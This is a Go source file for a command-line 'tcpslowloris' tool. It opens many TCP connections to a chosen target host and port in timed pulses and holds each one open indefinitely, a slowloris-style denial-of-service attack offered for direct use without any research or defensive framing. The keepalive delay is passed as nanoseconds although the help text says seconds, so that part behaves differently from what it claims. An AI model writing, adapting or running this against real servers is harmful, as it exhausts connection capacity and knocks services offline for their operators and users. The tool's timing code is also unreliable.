package main

import (
    "fmt"
    "net"
    "os"
    "time"
    "flag"
)

func main() {
    var target string
    var total,pulse,delay,interval,port int
    flag.StringVar(&target,"target", "", "Target address FQDN/IP")
    flag.IntVar(&port,"port", 80, "Target port number")
    flag.IntVar(&total,"total", 10, "Total TCP sessions")
    flag.IntVar(&pulse,"pulse", 10, "Number of sessions per pulse")
    flag.IntVar(&delay,"delay", 57, "The keepalive delay in seconds")
    flag.IntVar(&interval,"interval", 2 , "Interval between pulse")
    flag.Parse()
    if target == "" {
        fmt.Print(`Usage of ./tcpslowloris:
  -delay int
    	The keepalive delay in seconds (default 57)
  -interval int
    	Interval between pulse (default 2)
  -port int
    	Target port number (default 80)
  -pulse int
    	Number of sessions per pulse (default 10)
  -target string
    	Target address FQDN/IP
  -total int
    	Total TCP sessions (default 10)
`)
        os.Exit(1)
    }
    for i := 0 ; i < int(total / pulse) ; i++ {
        for y := 0 ;y < pulse ; y++ {
		go attack(target,port,delay)
	}
	time.Sleep(time.Duration(interval) * time.Second)
    }
    fmt.Print("All threads are up, Ctrl+c to exit\n")
    for {
        time.Sleep(1 * time.Second)
    }
    os.Exit(0)
}
func checkError(err error) {
    if err != nil {
        fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
        os.Exit(1)
    }
}

func attack(target string,port int,delay int) {
    service := target + ":" + fmt.Sprint(port)
    tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
    checkError(err)
    conn, err := net.DialTCP("tcp", nil, tcpAddr)
    checkError(err)
    conn.SetKeepAlive(true)
    conn.SetKeepAlivePeriod(time.Duration(delay))
    for {
        time.Sleep(1 * time.Second)
    }
}
